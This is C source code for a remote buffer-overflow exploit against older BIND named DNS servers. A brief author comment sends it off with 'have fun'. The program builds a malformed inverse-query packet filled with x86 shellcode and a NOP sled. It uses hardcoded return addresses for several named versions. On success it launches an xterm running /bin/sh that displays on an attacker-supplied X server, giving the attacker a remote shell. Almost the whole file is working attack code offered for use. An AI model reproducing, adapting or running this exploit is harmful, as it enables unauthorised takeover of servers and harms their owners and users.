/*
 * z, thnx.
 * ganked the xterm exec from adm, thnx.
 * have fun.
 * -prym
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netdb.h>

#define REMOTE
#define DEFAULT_ANBUF_OFFSET 300
#define DEFAULT_TARGET 0
#define DEFAULT_OPTIMIZED 0
#define DLEN_VAL 4
#define PRE_OF_DATALEN (1+(sizeof(short)*3)+sizeof(long))
#define ALEN_VAL (DLEN_VAL+PRE_OF_DATALEN)
#define EVILSPACE (PACKETSZ-PRE_OF_DATALEN)
#define RET_FROM_1NOP (PACKETSZ+(MAXDNAME+3)+(sizeof(int)*6)+4-PRE_OF_DATALEN)
#define OPT_RET_FROM_1NOP (PACKETSZ+(MAXDNAME+3)+4-PRE_OF_DATALEN)

struct target_type
{
  char desc[40];
  int systype;
  unsigned long addr;
  unsigned long opt_addr;
};

struct target_type target[] =
{
  {"x86 Linux 2.0.x named 4.9.5-P1",0,0xbfffef8c,0xbfffefb4},
  {"x86 Linux 2.0.x named 4.9.6-REL",0,0xbffff188,0xbffff194},
  {"x86 Linux 2.0.x named 8.1-REL",0,0xbffff3f0,0xbffff44c},
  {"x86 Linux 2.0.x named 8.1.1",0,0xbffff404,0xbffff45c},
  {"x86 Linux 2.0.x RH 4.2 named 4.9.5-P1",0,0,0xbfffeff8},
  {{0},0,0,0}
};

unsigned long resolve(char *host)
{
  long i;
  struct hostent *he;

  if((i=inet_addr(host))<0)
    if((he=gethostbyname(host))==NULL)
      return(0);
    else
      return(*(unsigned long *)he->h_addr);

  return(i);
}

int send_packet(int fd, char *buff, int len)
{
  char tmp[2], *ptr=tmp;

  PUTSHORT(len,ptr);
  if(write(fd,tmp,2)!=2)
    return(-1);

  if(write(fd,buff,len)!=len)
    return(-1);

  return(1);
}

int attack(int fd, struct in_addr us, struct target_type t,
	   unsigned long offset, int optimized)
{
  char buff[sizeof(HEADER)+PRE_OF_DATALEN+RET_FROM_1NOP+4], *ptr=buff;
  HEADER *dnsh=(HEADER *)buff;
  unsigned long i;
  int dlen, len=0, al=ALEN_VAL, dl=DLEN_VAL;

  memset(dnsh,0,sizeof(HEADER));
  dnsh->id = htons(31337);
  dnsh->opcode = IQUERY;
  dnsh->rd = 1;
  dnsh->ra = 1;
  dnsh->ancount = htons(1);
  ptr += sizeof(HEADER);
  len += sizeof(HEADER);

  *ptr = '\0';
  ptr++;
  PUTSHORT(T_A,ptr);
  PUTSHORT(C_IN,ptr);
  PUTLONG(31337,ptr);
  dlen = (optimized?OPT_RET_FROM_1NOP:RET_FROM_1NOP)+4;
  PUTSHORT(dlen,ptr);
  len += PRE_OF_DATALEN;

  memset(ptr,'X',(sizeof(buff)-(ptr-buff)));

  if(t.systype==0)
    {
#ifdef REMOTE
      char c1[] =
	"\xeb\x2f\x5f\xeb\x4a\x5e\x89\xfb\x89\x3e\x89\xf2\xb0\xfe\xae\x74"
	"\x14\x46\x46\x46\x46\x4f\x31\xc9\x49\xb0\xff\xf2\xae\x30\xc0\x4f"
	"\xaa\x89\x3e\xeb\xe7\x31\xc0\x89\x06\x89\xd1\x31\xd2\xb0\x0b\xcd"
	"\x80\xe8\xcc\xff\xff\xff";
      char c2[] =
	"/usr/bin/X11/xterm\xff-display\xff";
      char c3[32];
      char c4[] =
	"\xfe\xe8\xb1\xff\xff\xff";

      snprintf(c3,sizeof(c3),"%s:0\xff-e\xff/bin/sh\xff",inet_ntoa(us));

      c1[4] = (unsigned char)0x32+strlen(c2)+strlen(c3);
      c4[2] = (unsigned char)0xc9-strlen(c2)-strlen(c3);

      i = EVILSPACE-strlen(c1)-strlen(c2)-strlen(c3)-strlen(c4);

      memset(ptr,0x90,i);
      memcpy((ptr+i),c1,strlen(c1));
      memcpy((ptr+i+strlen(c1)),c2,strlen(c2));
      memcpy((ptr+i+strlen(c1)+strlen(c2)),c3,strlen(c3));
      memcpy((ptr+i+strlen(c1)+strlen(c2)+strlen(c3)),c4,strlen(c4));
#else
      char c0de[] =
        "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
        "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
        "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/tmp/hi";
      int i = EVILSPACE-strlen(c0de);

      memset(ptr,0x90,i);
      memcpy((ptr+i),c0de,strlen(c0de));
#endif
    }
  else
    return(0);

  if(!optimized)
    {
      memcpy((ptr+(dlen-16)),&al,sizeof(al));
      memcpy((ptr+(dlen-12)),&dl,sizeof(dl));
    }

  i = (optimized?t.opt_addr:t.addr)+offset;
  memcpy((ptr+(dlen-4)),&i,sizeof(i));
  len += dlen;

  return(send_packet(fd,buff,len));
}

int main(int argc, char *argv[])
{
  unsigned long offset=DEFAULT_ANBUF_OFFSET;
  int target_index=DEFAULT_TARGET, optimized=DEFAULT_OPTIMIZED, sock, i;
  struct sockaddr_in sa;
  struct in_addr xs;

  for(i=0;target[i].desc[0];i++);

  if(argc<3)
    {
      fprintf(stderr,"\ntarget types:\n");
      fprintf(stderr," %-2s : %-12s - %-12s - %s\n","tt","anbuf","opt anbuf",
	      "description");
      for(target_index=0;target_index<i;target_index++)
	fprintf(stderr," %-2d : 0x%-10x - 0x%-10x - %s\n",target_index,
		(unsigned int)target[target_index].addr,
		(unsigned int)target[target_index].opt_addr,
		target[target_index].desc);
      fprintf(stderr,
	      "\nerror: usage: %s <target> <X server> [tt] [opt] [offset]\n",
	      argv[0]);
      exit(-1);
    }

  if((argc>3)&&((target_index=atoi(argv[3]))>=i))
    {
      fprintf(stderr,"error: invalid target type %d\n",target_index);
      exit(-1);
    }

  if((target[target_index].addr==0)&&(target[target_index].opt_addr==0))
    {
      fprintf(stderr,"error: internal error\n");
      exit(-1);
    }

  if(argc>4)
    {
      optimized = atoi(argv[4]);
      if((optimized!=0)&&(optimized!=1))
	{
	  fprintf(stderr,"error: invalid optimization setting %d\n",optimized);
	  exit(-1);
	}
    }

  if((optimized==0)&&(target[target_index].addr==0))
    optimized = 1;

  if((optimized==1)&&(target[target_index].opt_addr==0))
    optimized = 0;

  if(argc>5)
    offset = atoi(argv[5]);

  if(!(xs.s_addr=resolve(argv[2])))
    {
      fprintf(stderr,"error: can not resolve: %s\n",argv[2]);
      exit(-1);
    }

  if(!(sa.sin_addr.s_addr=resolve(argv[1])))
    {
      fprintf(stderr,"error: can not resolve: %s\n",argv[1]);
      exit(-1);
    }

  sa.sin_family = AF_INET;
  sa.sin_port = htons(53);

  if((sock=socket(sa.sin_family,SOCK_STREAM,IPPROTO_TCP))==(-1))
    {
      perror("error: socket");
      exit(-1);
    }

  if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))==(-1))
    {
      perror("error: connect");
      exit(-1);
    }

  printf("target             : %s\n",inet_ntoa(sa.sin_addr));
  printf("target type        : %s\n",target[target_index].desc);
  printf("optimized named    : %s\n",(optimized?"YES":"NO"));
  printf("anbuff addr        : 0x%x\n",(unsigned int)
	 (optimized?target[target_index].opt_addr:target[target_index].addr));
  printf("anbuff addr offset : %lu\n",offset);
  printf("xterm display dest : %s:0\n",inet_ntoa(xs));
  printf("exploiting . . .\n");

  switch(attack(sock,xs,target[target_index],offset,optimized))
    {
    case -1:
      perror("error: attack");
      return(-1);
      break;

    case 0:
      fprintf(stderr,"error: internal error\n");
      return(-1);
      break;
    }

  if(close(sock)!=0)
    {
      perror("error: close");
      return(-1);
    }

  exit(0);
}
